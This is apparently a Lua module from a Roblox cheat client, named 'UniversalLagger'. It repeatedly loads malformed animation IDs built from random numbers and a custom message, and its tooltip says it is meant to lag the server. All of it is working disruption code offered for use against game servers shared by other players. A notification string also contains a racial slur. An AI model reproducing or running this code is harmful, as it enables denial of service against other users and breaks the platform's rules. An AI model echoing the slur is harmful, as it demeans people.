local UniversalLagger
local Message

UniversalLagger = vape.Categories.World:CreateModule({
	Name = 'UniversalLagger',
	Function = function(callback)
		if callback then
			local random = Random.new()

            notif('UniversalLagger', 'yo nigga lets see their reaction !1!1!11!')
			repeat
				local character = lplr.Character
				local animator = character and character:FindFirstChildWhichIsA('Animator', true) or nil

				if animator then
					local animation = Instance.new('Animation')
					animation.AnimationId = 'http=507770677\1'..random:NextInteger(1, 1000000)..'\n'..(Message.Value or '')..'\n'
					local loaded = animator:LoadAnimation(animation)
					loaded:Play(0, 0.0001, 0)
				end

				task.wait(1 / Rate.Value)
			until not UniversalLagger.Enabled
		end
	end,
	Tooltip = 'lags ur server, thx v3rm'
})
Message = UniversalLagger:CreateTextBox({
	Name = 'Message',
	Placeholder = 'Message',
	Tooltip = 'yk custom it'
})

Rate = UniversalLagger:CreateSlider({
	Name = 'Rate',
	Min = 1,
	Max = 144,
	Default = 60,
	Suffix = function(val)
		return val == 1 and 'time per second' or 'times per second'
	end,
	Tooltip = 'load rate so ur device dont fuck off (per frame)'
})
